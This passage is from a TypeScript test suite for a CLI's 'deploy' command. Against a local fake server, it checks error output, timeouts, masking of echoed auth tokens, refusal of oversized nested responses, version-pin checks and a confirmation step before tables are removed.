  const { root } = project({ "generated_tables/weekly.yml": "kind: live\nsql: SELECT 1\n" });
  const t = { terminal: WIDTH };
  const f = (at: number): string => forgedAt(WIDTH, at);
  const step = "x".repeat(Math.max(1, WIDTH - 20)) + "Next:" + " mason destroy" + " ".repeat(33) + "clean up, then deploy again";
  // a POST's failure: its message (begun after "✘ mason deploy: "), why and fix (after their labels), at 403, 422 and 500
  for (const [status, message] of [[403, f("✘ mason deploy: ".length)], [422, step], [500, f(16)]] as const) {
    const { a } = await deployWith({ post: { status, body: { error: { code: "invalid", message, why: f(8), fix: f(8) } } } }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    assert.match(a.stderr, /destroy/, `${status}: the value is shown`);
  }
  // a refused and a failed deploy's failure: message, why, fix
  for (const status of ["refused", "failed"]) {
    const failure = { code: "bad_source", message: f(16), why: f(8), fix: f(8) };
    const { a } = await deployWith({ get: () => at(status, { failure }) }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    assert.match(a.stderr, /destroy/);
  }
  // a GET's failure midway (the token revoked): the same words, in the same rows
  {
    const { a } = await deployWith({ get: () => ({ status: 401, body: { error: { code: "unauthenticated", message: step, why: f(8), fix: f(8) } } }) }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, a.stderr);
  }
  // the wait's lines, the spinner's, a 503's note, and the report, on the terminal: each broken by the CLI, never by it
  {
    const steps = [at("applying", { phase: "checking" }), { status: 503, raw: "busy" } as Reply, at("starting", { phase: "syncing" }), at("running")];
    const { a } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 0, a.stderr);
    assert.match(a.stderr, /Running:/);
  }
  // the timeout's failure, the dry run's rows (each a file and its 64-digit sha256), and a warning, on the terminal
  {
    const { a } = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1s"], {}, t);
    assert.equal(a.code, 124, a.stderr);
    const d = await deployWith({}, root, ["--replica", "acme/shop", "--dry-run"], {}, t);
    assert.equal(d.a.code, 0, d.a.stderr);
    assert.match(d.a.stderr, /^ {2}!( |$)/m);
  }
});

test("mason deploy --timeout: past it, exit 124 naming the deploy's id and that it may still finish; a bare number is seconds; a timeout that is not a duration of 1s to 24h is a wrong line", async () => {
  const { root } = project();
  const { a } = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1s"]);
  assert.equal(a.code, 124, a.stderr);
  assert.match(a.stderr, /^✗ mason deploy: deploy dep_01abc to acme\/shop did not finish within 1s\n {2}why {3}it was last: (Queued|Applying)[^\n]*\n {2}fix {3}nothing was stopped, and it may still finish: the service's web app shows deploy dep_01abc of acme\/shop, as GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc does \(the hosted API\); a longer wait is --timeout 30m\n$/m);
  const j = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1", "--json"]);
  assert.equal(j.a.code, 124);
  const v = JSON.parse(j.a.stdout) as { deploy: { id: string }; error: { code: string } };
  assert.equal(v.deploy.id, ID);
  assert.equal(v.error.code, "timeout");
  for (const bad of ["0s", "0", "abc", "500ms", "25h", "2d"]) {
    const r = await deployWith({}, root, ["--replica", "acme/shop", "--timeout", bad]);
    assert.equal(r.a.code, 2, bad);
    assert.match(r.a.stderr, /^✗ mason deploy: --timeout /, bad);
    assert.deepEqual(r.requests, [], bad);
  }
});

test("mason deploy: needs a project — none here is the state's answer, nothing sent", async () => {
  const { a, requests } = await deployWith({}, temp("mason-empty-"), ["--replica", "acme/shop", "--json"]);
  assert.equal(a.code, 1);
  assert.equal((JSON.parse(a.stdout) as { error: { code: string } }).error.code, "no_project");
  assert.deepEqual(requests, []);
});

test("mason deploy: a service that echoes the token it was sent in another form — its body, split, re-cased, URL-encoded, a slice, pieces, a piece in each field — shows no more than a quarter of it in all, on stdout, stderr or in --json", { timeout: 300_000 }, async () => {
  const { root } = project();
  // one fixed token, so the verdict is the same on every run (tests/hosted-fake.ts echoToken)
  const token = echoToken("ci"); SECRETS.push(token);
  const words = ([m, w, f]: [string, string, string]) => ({ message: `the token ${m} is not known`, why: `it was sent as ${w}`, fix: `sign in again, not as ${f}` });
  // a refusal of the deploy sent, and a deploy Mason on the replica refused: the two failures the service words; a
  // person's stderr for the POST's, the refused deploy's in --json alone, its stderr read there too (each run of a
  // refused deploy waits out a poll, and its words go through the same failureShape)
  const runs = (fields: [string, string, string]): Array<[string, Script, boolean]> => [
    ["the POST's 401", { post: { status: 401, body: { error: { code: "unauthenticated", ...words(fields) }, next: [] } } }, false],
    ["the POST's 401", { post: { status: 401, body: { error: { code: "unauthenticated", ...words(fields) }, next: [] } } }, true],
    ["a refused deploy", { get: () => at("refused", { failure: { code: "bad_source", ...words(fields) } }) }, true],
  ];
  const deploy = (script: Script, json: boolean) => deployWith(script, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])], { MASON_TOKEN: token });
  // the CLI's own words share no run of the body: what is counted below is the echo's alone
  for (const [where, script, json] of runs(["it", "it", "it"])) {
    const { a, url, home } = await deploy(script, json);
    assert.equal(bodyCovered(`${a.stdout}\n${a.stderr}`, token, [root, url, home]), 0, `nothing echoed, in ${where}${json ? ", --json" : ""}: the fixed token shares a run with the CLI's own words:\n${a.stdout}${a.stderr}`);
  }
  for (const { what, fields, exact } of echoForms(token)) {
    for (const [where, script, json] of runs(fields)) {
      const { a, url, home } = await deploy(script, json);
      const at_ = `${what}, in ${where}${json ? ", --json" : ""}`;
      assert.equal(a.code, 1, `${at_}: ${a.stdout}${a.stderr}`);
      assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, token, [root, url, home]), `${at_}: more than a quarter of the body is shown:\n${a.stdout}${a.stderr}`);
      // what is printed is the service's words, the echo masked: never dropped, never re-worded (where a mask may take
      // in a letter beside it that is the body's next, by chance, or one field is shown, the words are not held exact)
      const said = json ? (JSON.parse(a.stdout) as { error: { message: string; fix: string } }).error : null;
      if (!exact) assert.match(a.stdout + a.stderr, /\*{4}/, at_);
      else if (said) assert.deepEqual([said.message, said.fix], ["the token **** is not known", "sign in again, not as ****"], at_);
      else assert.match(a.stderr, /✗ mason deploy: the token \*\*\*\* is not known\n {2}why {3}it was sent as \*\*\*\* \(/, at_);
    }
  }
});

test("mason deploy: an answer whose deploy's id, status, phase, times, refusal's code or a key outside its shape carries the token — whole, its body, in lower case, 11 of its characters in a row — is refused whole, by its status: nothing of it is printed, for a person or in --json, and nothing steered by it (issue 627)", { timeout: 300_000 }, async () => {
  const { root } = project();
  const token = runToken("ci"); SECRETS.push(token);
  const post = (deploy: Record<string, unknown>, more: Record<string, unknown> = {}): Script => ({ post: { status: 201, headers: { "retry-after": "1" }, body: { deploy: { id: ID, status: "queued", createdAt: CREATED, ...deploy }, ...more } } });
  const get = (status: string, deploy: Record<string, unknown>, more: Record<string, unknown> = {}): Script => ({ get: () => {
    const r = at(status, deploy) as { status: number; body: Record<string, unknown>; headers: Record<string, string> };
    return { ...r, body: { ...r.body, ...more } };
  } });
  const cases: Array<[what: string, script: (v: string, digits: string) => Script, step: "POST" | "GET"]> = [
    ["the POST's id", (v) => post({ id: v }), "POST"],
    ["the POST's status", (v) => post({ status: v }), "POST"],
    ["the POST's createdAt", (_, d) => post({ createdAt: `2026-11-02T10:00:00.${d}Z` }), "POST"],
    ["a key outside the POST's shape", (v) => post({}, { note: v }), "POST"],
    ["a poll's phase", (v) => get("applying", { phase: v }), "GET"],
    ["a poll's finishedAt", (_, d) => get("running", { finishedAt: `2026-11-02T10:01:00.${d}Z` }), "GET"],
    ["a refusal's code", (v) => get("refused", { failure: { code: v, message: "refused" } }), "GET"],
    ["a key outside a poll's shape", (v) => get("running", {}, { note: v }), "GET"],
  ];
  // each case's forms side by side, as a person and with --json: the file's time is bounded
  for (const [what, script, step] of cases) {
    await Promise.all(runForms(token).flatMap((form) => [false, true].map(async (json) => {
      {
        const at_ = `${what}, ${form.what}${json ? ", --json" : ""}`;
        const { a, requests } = await deployWith(script(form.value, form.digits), root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])], { MASON_TOKEN: token });
        const said = `${a.stdout}\n${a.stderr}`;
        assert.equal(a.code, 1, `${at_}: ${said}`);
        const where = step === "POST" ? "POST /v1/replicas/acme/shop/deploys with 201, where a deploy was sent" : `GET /v1/replicas/acme/shop/deploys/${ID} with 200, where the deploy's state was asked for`;
        const message = json ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr;
        assert.ok(message.includes(` answered ${where}`), `${at_}: said by its status:\n${said}`);
        assert.ok(!showsRun(said, token) && !said.includes(token), `${at_}: printed the token:\n${said}`);
        // a POST refused steers nothing: no request is made of an id it carried
        if (step === "POST") assert.deepEqual(requests.map((r) => r.method), ["POST"], at_);
      }
    })));
  }
});

test("mason deploy: an answer nested deeper than any documented shape — 32,000 deep, within the 64 KiB an answer is read to — on the POST or on a poll, is refused by its status, never a crash, for a person or in --json (PR 645's review)", { timeout: 300_000 }, async () => {
  const { root } = project();
  const nest = "[".repeat(32_000) + "]".repeat(32_000);
  const cases: Array<[what: string, script: Script, where: string]> = [
    ["the POST", { post: { status: 201, headers: { "retry-after": "1" }, json: `{"deploy":{"id":"${ID}","status":"queued","createdAt":"${CREATED}"},"x":${nest}}` } },
      "POST /v1/replicas/acme/shop/deploys with 201, where a deploy was sent"],
    ["a poll", { get: () => ({ status: 200, json: `{"deploy":{"id":"${ID}","status":"running","createdAt":"${CREATED}","finishedAt":"${CREATED}"},"x":${nest}}` }) },
      `GET /v1/replicas/acme/shop/deploys/${ID} with 200, where the deploy's state was asked for`],
  ];
  await Promise.all(cases.flatMap(([what, script, where]) => [false, true].map(async (json) => {
    const { a } = await deployWith(script, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    const said = `${a.stdout}\n${a.stderr}`;
    assert.equal(a.code, 1, `${what}${json ? ", --json" : ""}: ${said}`);
    assert.ok((json ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr).includes(` answered ${where}`), `${what}: said by its status:\n${said}`);
    assert.doesNotMatch(said, /call stack|RangeError|bug in mason/, what);
  })));
});

test("mason deploy: every byte written passes the output's gate — an id of 10 of the token's body, which every per-value test takes, followed in what is written by the CLI's own word that is the body's 11th character, is refused at the write: what was written shows 10 in a row at most, the refusal is the CLI's, exit 1, for a person and in --json (PR 645's class round)", { timeout: 120_000 }, async () => {
  const { root } = project();
  // the id is the body's first 10; the body's 11th is the first letter the CLI writes next: "Queued" on stderr for a
  // person, "status" in --json (written in parts, so no line here is shaped as a token)
  for (const [json, eleventh] of [[false, "Q"], [true, "s"]] as const) {
    const token = ["masondata", "ci", `Ab3d5F7h9J${eleventh}Xk2Lm7Np4Rt8Vw3Ys6Hb1Cd5Fg0Jk-Ue`].join("_"); SECRETS.push(token);
    const id = "Ab3d5F7h9J";
    const script: Script = { post: { status: 201, headers: { "retry-after": "1" }, body: { deploy: { id, status: "queued", createdAt: CREATED } } },
      get: () => ({ status: 200, body: { deploy: { id, status: "running", createdAt: CREATED, finishedAt: CREATED } } }) };
    // the fake answers GET for ID alone: this id's polls are answered here by a fake of its own
    const server = await idFake(id, script);
    try {
      const h = temp("mason-home-");
      const a = await mason(root, ["deploy", "--replica", "acme/shop", ...(json ? ["--json"] : [])], envFor(h, server.url, { MASON_TOKEN: token }));
      const all = `${a.stdout}\n${a.stderr}`;
      assert.equal(a.code, 1, all);
      const said = json ? (JSON.parse(a.stdout) as { error: { code: string; message: string } }).error : null;
      if (said) assert.deepEqual([said.code, said.message], ["refused", "the service's answer would print a secret this command holds, so nothing more of it is printed"]);
      else assert.match(a.stderr, /^✗ mason deploy: the service's answer would print a secret this command holds, so nothing more of it is printed$/m);
      assert.ok(!showsRun(all, token), `nothing of 11 in a row is written:\n${all}`);
      if (!json) assert.match(a.stderr, /: deploy Ab3d5F7h9J\n/, "what was written before it stays: 10 in a row");
      assert.doesNotMatch(a.stdout, json ? /"deploy"/ : /Deployed to/, "the answer is not written");
    } finally { await server.close(); }
  }
});

/** A fake whose deploy is `id` (cli-deploy's own fake answers GET for ID alone). */
async function idFake(id: string, script: Script): Promise<{ url: string; close: () => Promise<void> }> {
  let gets = 0;
  const server = http.createServer((req, res) => {
    req.resume();
    req.on("end", () => {
      const p = new URL(req.url ?? "/", "http://x").pathname;
      const reply = (req.method === "POST" && p === "/v1/replicas/acme/shop/deploys" ? script.post : p === `/v1/replicas/acme/shop/deploys/${id}` ? script.get!(gets++) : { status: 404, body: {} }) as Exclude<Reply, "drop">;
      SERVED.push(JSON.stringify(reply.headers ?? {}), JSON.stringify(reply.body));
      res.writeHead(reply.status, { "content-type": "application/json", ...reply.headers });
      res.end(JSON.stringify(reply.body));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  return { url: `http://127.0.0.1:${(server.address() as { port: number }).port}`, close: () => new Promise((resolve) => { server.closeAllConnections(); server.close(() => resolve()); }) };
}

test("mason deploy: the output's gate refuses no honest deploy by chance — its output as written, a person's and --json, against 2,000 random tokens from a fixed seed, none refused at ECHO_RUN, and a run of 5 met by chance within its bound (the model the bound is derived from, seen)", { timeout: 120_000 }, async (t) => {
  const { root } = project();
  const texts: string[] = [];
  for (const json of [false, true]) {
    const steps = [at("applying", { phase: "checking" }), at("starting", { phase: "syncing" }), at("running")];
    const { a } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 0, a.stderr);
    texts.push(a.stdout, a.stderr, a.stdout + a.stderr);
  }
  const m = await measureGate(texts, "mason-645-gate-deploy", 2000);
  t.diagnostic(`measured: ${JSON.stringify(m)}`);
  assert.equal(m.refused, 0, `${m.refused} of 2000 honest deploys refused`);
  assert.ok(m.bound < 1e-6, `the bound at ECHO_RUN: ${m.bound}`);
  assert.ok(m.shortRefused > 0 && m.shortRefused <= m.shortBound, `a run of 5: ${m.shortRefused}, its bound ${m.shortBound}`);
});

/** A replica as the service says it (docs/HOSTED-API.md `Replica`), with the Mason it runs when `mason` is given. */
const replicaSaying = (mason?: unknown): Reply => ({ status: 200, body: { replica: { org: "acme", name: "shop", region: "eu", sizeGb: 50, hostId: "brisk-otter-4821", state: "ready",
  createdAt: CREATED, allowlist: [], pending: [], ...(mason === undefined ? {} : { mason }) } } });

test("mason deploy asks the replica's Mason before it sends: a pin that fits neither the version it runs nor the one installed is refused, naming both, nothing sent; one that fits either is sent; a service that says none, or does not answer the question, leaves the pin to the replica, and so does an answer it cannot read, unless it carries the token (issue 764)", async () => {
  const { root } = project();   // mason.yml pins 0.7.0
  // the pin fits: the version it runs (same line, at or past the pin), or the newer one installed
  for (const mason of [{ version: "0.7.0", latest: "0.7.0" }, { version: "0.7.3", latest: "0.9.0", next: null }, { version: "0.6.5", latest: "0.7.4", next: "0.7.1" }]) {
    const { a, requests, asked } = await deployWith({ replica: replicaSaying(mason) }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 0, `${JSON.stringify(mason)}: ${a.stdout}`);
    assert.deepEqual(asked.map((q) => `${q.method} ${q.body}`), ["GET "], JSON.stringify(mason));
    assert.ok(asked[0]!.at <= requests[0]!.at, "asked before the POST");
    assert.equal(posts(requests).length, 1, JSON.stringify(mason));
  }
  // older than the pin's line: the service offers one that runs it — upgrade is a way out
  const older = await deployWith({ replica: replicaSaying({ version: "0.6.5", latest: "0.7.4", next: null }) }, root, ["--replica", "acme/shop"]);
  assert.equal(older.a.code, 1, older.a.stderr);
  assert.deepEqual(older.requests, [], "nothing sent");
  assert.equal(older.a.stderr, "✗ mason deploy: mason/mason.yml pins Mason 0.7.0, and acme/shop runs Mason 0.6.5: it would not run the project\n" +
    "  why   a replica runs a project pinned to the release line of the Mason it runs (0.6.x), at that version or older; nothing was sent\n" +
    "  fix   write the project for Mason 0.6.5: its mason command is npx @mason-data/cli@0.6.5 (read the release notes between the two, change what they say, then set version: 0.6.5 in mason/mason.yml); or upgrade the replica to Mason 0.7.4, which runs the project as it is: mason replica upgrade acme/shop\n\n" +
    "Next:\n  mason replica upgrade acme/shop               move it to Mason 0.7.4\n  mason replica status acme/shop                its Mason version\n");
  // newer than the pin's line, with a newer line installed too: no upgrade runs it; write the project for the one installed
  const newer = await deployWith({ replica: replicaSaying({ version: "0.8.1", latest: "0.9.2", next: "0.9.2" }) }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(newer.a.code, 1, newer.a.stdout);
  assert.deepEqual(newer.requests, []);
  const e = JSON.parse(newer.a.stdout) as { error: { code: string; message: string; why: string; fix: string }; next: Array<{ command: string }> };
  assert.deepEqual([e.error.code, e.error.message], ["refused", "mason/mason.yml pins Mason 0.7.0, and acme/shop runs Mason 0.8.1, with 0.9.2 installed: it would not run the project"]);
  assert.match(e.error.why, /\(0\.8\.x\), at that version or older, or to the line of the one installed \(0\.9\.x\), which then starts; nothing was sent$/);
  assert.match(e.error.fix, /^write the project for Mason 0\.9\.2: its mason command is npx @mason-data\/cli@0\.9\.2 /);
  assert.doesNotMatch(e.error.fix, /upgrade/);
  assert.deepEqual(e.next.map((n) => n.command), ["mason replica status acme/shop"]);
  // a newer patch of the pin's line than the replica runs: refused, as the image would
  const patch = await deployWith({ replica: replicaSaying({ version: "0.6.9", latest: "0.6.9" }) }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(patch.a.code, 1);
  // a service that says no version (an older one), a status other than 200, no answer: sent, the replica holds the pin
  for (const [what, replica] of [["no mason key", replicaSaying()], ["mason: null", replicaSaying(null)], ["404", undefined],
    ["500", { status: 500, body: { error: { code: "failed", message: "x" } } }], ["no answer", "drop"]] as Array<[string, Reply | undefined]>) {
    const { a, requests, asked } = await deployWith(replica === undefined ? {} : { replica }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 0, `${what}: ${a.stdout}`);
    assert.equal(asked.length, 1, what);
    assert.equal(posts(requests).length, 1, what);
  }
  // a 200 this CLI cannot read — a version it does not take or out of order, a mason that is no object, a pending change
  // of a newer service's, another replica's name, deleted with no deletion, not JSON — cannot tell: sent, as before
  const ok200 = (replica: Record<string, unknown>): Reply => ({ status: 200, body: { replica: { ...(replicaSaying() as { body: { replica: Record<string, unknown> } }).body.replica, ...replica } } });
  const unread: Array<[string, Reply]> = [
    ...[{ version: "v0.6.0", latest: "0.6.0" }, { version: "0.6.0", latest: "0.5.0" }, { version: "0.6.0", latest: "0.8.0", next: "0.6.0" },
      { version: "0.6.0", latest: "0.8.0", next: "0.9.0" }, { version: "0.6.0" }, "0.6.0", { version: "0.13.0-rc1", latest: "0.13.0-rc1" }].map((m): [string, Reply] => [JSON.stringify(m), replicaSaying(m)]),
    ["an unknown pending change", ok200({ pending: [{ change: "resize", state: "pending", attempts: 0 }], mason: { version: "0.6.0", latest: "0.6.0" } })],
    ["another name", ok200({ name: "other", mason: { version: "0.6.0", latest: "0.6.0" } })],
    ["deleted with no deletion", ok200({ state: "deleted", mason: { version: "0.6.0", latest: "0.6.0" } })],
    ["not JSON", { status: 200, raw: "<html>a proxy's page</html>" }],
  ];
  for (const [what, replica] of unread) {
    const { a, requests, asked } = await deployWith({ replica }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 0, `${what}: ${a.stdout}`);
    assert.equal(asked.length, 1, what);
    assert.equal(posts(requests).length, 1, `${what}: sent, the pin left to the replica`);
  }
  // but an answer carrying the token — in a value, or in the service's words — is refused whole, nothing sent
  for (const where of ["value", "words"] as const) {
    const token = newToken("ci"); SECRETS.push(token);
    const replica = where === "value" ? ok200({ hostId: token }) : ok200({ pending: [{ change: "resize", state: "failed", attempts: 1, failure: `it said ${token}` }] });
    const { a, requests } = await deployWith({ replica }, root, ["--replica", "acme/shop", "--json"], { MASON_TOKEN: token });
    assert.equal(a.code, 1, `${where}: ${a.stdout}`);
    assert.match((JSON.parse(a.stdout) as { error: { message: string } }).error.message, /answered GET \/v1\/replicas\/acme\/shop\?project=1 with 200, where what the replica runs was asked for$/, where);
    assert.deepEqual(requests, [], `${where}: nothing sent`);
  }
  // the token's body split by a control character or an ANSI code, every 4 or 8 characters, in the service's words: read
  // raw, as the masks read them (a stringified answer escapes them, and its letters break the run), refused whole —
  // whether the answer is one this CLI cannot read or one it reads and whose Mason fits the pin
  for (const sep of ["\n", "\t", "\u0000", "\u001b[31m"]) for (const size of [4, 8]) for (const readable of [false, true]) {
    const token = newToken("ci"); SECRETS.push(token);
    const body = token.replace(/^masondata_ci_/, "");
    const words = `it said ${(body.match(new RegExp(`.{1,${size}}`, "g")) ?? []).join(sep)}`;
    const what = `${JSON.stringify(sep)} every ${size}, ${readable ? "a readable 200" : "an unreadable 200"}`;
    const replica = ok200(readable ? { pending: [{ change: "upgrade", state: "failed", attempts: 1, failure: words }], mason: { version: "0.7.0", latest: "0.7.0" } }
      : { pending: [{ change: "resize", state: "failed", attempts: 1, failure: words }] });
    const { a, requests } = await deployWith({ replica }, root, ["--replica", "acme/shop", "--json"], { MASON_TOKEN: token });
    assert.equal(a.code, 1, `${what}: ${a.stdout}`);
    assert.match((JSON.parse(a.stdout) as { error: { message: string } }).error.message, /where what the replica runs was asked for$/, what);
    assert.deepEqual(requests, [], `${what}: nothing sent`);
  }
  // a project with no mason.yml is unpinned: no version refuses it, as the image runs it (the replica is still asked
  // what it runs, for the plan)
  const { root: bare } = project({ "mason.yml": null });
  const unpinned = await deployWith({ replica: replicaSaying({ version: "0.6.5", latest: "0.6.5" }) }, bare, ["--replica", "acme/shop", "--json"]);
  assert.equal(unpinned.a.code, 0, unpinned.a.stdout);
  assert.equal(unpinned.asked.length, 1);
  assert.equal(posts(unpinned.requests).length, 1);
});

/** The replica's answer with the project it runs now (docs/HOSTED-API.md "What the deploy changes"): `files` (relative
 *  path → text) and its tables' sizes, beside a replica that says no Mason version (so no pin is checked). */
const running = (files: Record<string, string>, tables: Array<{ table: string; rows: number | null; bytes: number | null }> = []): Reply => {
  const r = replicaSaying() as { status: number; body: { replica: Record<string, unknown> } };
  return { status: 200, body: { replica: r.body.replica, project: {
    files: Object.entries(files).sort(([a], [b]) => a < b ? -1 : 1).map(([p, content]) => ({ path: p, sha256: sha(content), content })), tables } } };
};
/** What the replica runs in the plan's tests: three tables kept off, the generated table daily, two roles, pin 0.6.0. */
const RUNNING = {
  "sources/shop.yml": "kind: postgres\nurl: ${DATABASE_URL}\nsync: off\ntables:\n  orders: {}\n  customers:\n    columns: [id, name]\n  items: {}\n  events:\n    key: [id]\n  billing.invoices: {}\n",
  "mason.yml": "version: 0.6.0\n",
  "roles.yml": "default: everything\nroles:\n  everything:\n    tables: all\n  agent:\n    tables:\n      orders: {}\n  bi:\n    tables: all\n",
  "generated_tables/daily.yml": DAILY,
  "generated_tables/old.yml": DAILY,
};
const SIZES = [{ table: "public.items", rows: 1_200_000, bytes: 734_003_200 }, { table: "billing.invoices", rows: null, bytes: 2048 }, { table: "public.payments", rows: 5, bytes: null }];
/** The project deployed over it: every kind of change at once. */
const CHANGED = {
  "sources/shop.yml": "kind: postgres\nurl: ${DATABASE_URL}\nsync: off\ntables:\n  orders:\n    sync: poll 30s\n  customers:\n    columns: [id, name, email]\n  events:\n    key: [uuid]\n  payments: {}\n",
  "roles.yml": "default: agent\nroles:\n  everything:\n    tables: all\n  agent:\n    tables:\n      orders: {}\n      customers: {}\n  analyst:\n    tables:\n      orders: {}\n",
  "generated_tables/daily.yml": DAILY.replace("count(*)", "count(*) + 0"),
  "generated_tables/weekly.yml": DAILY,
};
const PLAN = {
  tables: {
    added: [{ table: "public.payments", rows: 5, bytes: null }],
    removed: [{ table: "billing.invoices", rows: null, bytes: 2048 }, { table: "public.items", rows: 1_200_000, bytes: 734_003_200 }],
    changed: [
      { table: "public.customers", columns: true, key: false, sync: null },
      { table: "public.events", columns: false, key: true, sync: null },
      { table: "public.orders", columns: false, key: false, sync: { from: "off", to: "poll 30s" } },
    ],
  },
  generatedTables: { added: ["public.weekly"], removed: ["public.old"], changed: ["public.daily"] },
  roles: { added: ["analyst"], removed: ["bi"], changed: ["agent"], default: { from: "everything", to: "agent" } },
  pin: { from: "0.6.0", to: "0.7.0" },
};
/** The plan's rows, as a person reads them. */
const PLAN_ROWS = [
  "adds     table public.payments (5 rows): its first sync starts",
  "removes  table billing.invoices (2.0 KiB): its synced data is dropped, and syncing it again is a new first sync, reading every row from the source",
  "removes  table public.items (1,200,000 rows, 700.0 MiB): its synced data is dropped, and syncing it again is a new first sync, reading every row from the source",
  "changes  table public.customers: its columns",
  "changes  table public.events: its key",
  "changes  table public.orders: its sync (off to poll 30s)",
  "adds     generated table public.weekly",
  "removes  generated table public.old",
  "changes  generated table public.daily",
  "adds     role analyst",
  "removes  role bi",
  "changes  role agent",
  "changes  the default role: everything to agent",
  "changes  the pin: Mason 0.6.0 to Mason 0.7.0",
];
const REMOVED = "billing.invoices (2.0 KiB), public.items (1,200,000 rows, 700.0 MiB)";

test("mason deploy shows what it changes on the replica, worked out against what the replica runs now — tables added and removed with their sizes, columns, key and sync changed, generated tables, roles, the default role and the pin — in --dry-run and before a deploy, as rows and in --json (issue 550)", async () => {
  const { root } = project(CHANGED);
  // --dry-run --json: the plan in its declared shape, nothing sent; the replica asked for what it runs
  const dry = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", "--dry-run", "--json"]);
  assert.equal(dry.a.code, 0, dry.a.stdout);
  const v = JSON.parse(dry.a.stdout) as { plan: unknown; planUnknown: unknown; deploy: unknown };
  assert.deepEqual(v.plan, PLAN);
  assert.equal(v.planUnknown, null);
  assert.equal(v.deploy, null);
  assert.deepEqual(dry.asked.map((q) => `${q.method} ${q.search}`), ["GET ?project=1"]);
  assert.deepEqual(dry.requests, [], "a dry run sends nothing");
  // --dry-run for a person: each change a row, after the files
  const said = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", "--dry-run"]);
  assert.equal(said.a.code, 0, said.a.stderr);
  const rows = said.a.stdout.split("\n").filter((l) => /^ {2}(adds|removes|changes) /.test(l)).map((l) => l.trim().replace(/^(\S+) +/, (_m, verb: string) => `${verb.padEnd(9)}`));
  assert.deepEqual(rows, PLAN_ROWS);
  // a deploy (with --yes: it removes two tables) shows the plan first, on stderr, then sends; --json carries it at the end
  const sent = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", "--yes"]);
  assert.equal(sent.a.code, 0, sent.a.stderr);
  const lines = sent.a.stderr.split("\n");
  assert.equal(lines[0], "What the deploy changes on acme/shop:");
  assert.deepEqual(lines.slice(1, 1 + PLAN_ROWS.length), PLAN_ROWS.map((r) => `  ${r}`));
  assert.match(lines[1 + PLAN_ROWS.length]!, /^Sent 5 files /);
  const j = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", "--yes", "--json"]);
  assert.equal(j.a.code, 0, j.a.stdout);
  assert.deepEqual((JSON.parse(j.a.stdout) as { plan: unknown }).plan, PLAN);
  assert.equal(j.a.stderr, "");
  // the same files the replica runs: a plan that changes nothing, said so; and a replica that runs no project yet: all added
  const { root: same } = project();
  const files = Object.fromEntries(projectFiles(path.join(same, "mason")).map((f) => [path.relative(path.join(same, "mason"), f), fs.readFileSync(f, "utf8")]));
  const none = await deployWith({ replica: running(files) }, same, ["--replica", "acme/shop"]);
  assert.equal(none.a.code, 0, none.a.stderr);
  assert.match(none.a.stderr, /^What the deploy changes on acme\/shop: none of its tables, generated tables, roles or pin\nSent /);
  const fresh = await deployWith({ replica: running({}) }, same, ["--replica", "acme/shop", "--dry-run", "--json"]);
  const p = (JSON.parse(fresh.a.stdout) as { plan: typeof PLAN }).plan;
  assert.deepEqual(p.tables.added.map((t) => t.table), ["public.customers", "public.orders"]);
  assert.deepEqual([p.tables.removed, p.roles.added, p.pin], [[], ["agent", "everything"], { from: null, to: "0.7.0" }]);
});

test("mason deploy: a deploy that removes a table the replica syncs is confirmed — the replica's name typed back at a terminal, else refused naming each table and its size unless --yes, with --json too; the tables confirmed are sent; an added table is never asked about (issue 550)", async () => {
  const { root } = project(CHANGED);
  const confirmed = (q: Req[]): unknown => (JSON.parse(posts(q)[0]!.body) as { confirmed?: unknown }).confirmed;
  // no terminal, no --yes: refused, naming the tables, the way out --yes; nothing sent
  for (const json of [false, true]) {
    const { a, requests } = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.deepEqual(requests, [], "nothing sent");
    const message = `the deploy removes 2 tables acme/shop syncs: ${REMOVED}`;
    const why = "of a removed table, its synced data is dropped, and syncing it again is a new first sync, reading every row from the source: such a deploy is confirmed at a terminal, or with --yes; nothing was sent";
    const fix = "if they are meant to go: mason deploy --replica acme/shop --yes; if not, add them back to the sources file";
    if (json) {
      assert.deepEqual(JSON.parse(a.stdout), { error: { code: "refused", message, why, fix }, next: [{ command: "mason deploy --replica acme/shop --yes", what: "deploy, removing them" }] });
    } else {
      assert.ok(a.stderr.endsWith(`✗ mason deploy: ${message}\n  why   ${why}\n  fix   ${fix}\n\nNext:\n  mason deploy --replica acme/shop --yes        deploy, removing them\n`), a.stderr);
    }
  }
  // --yes (no terminal, and with --json): sent, the tables confirmed named in the request
  for (const argv of [["--yes"], ["--yes", "--json"]]) {
    const { a, requests } = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", ...argv]);
    assert.equal(a.code, 0, a.stdout + a.stderr);
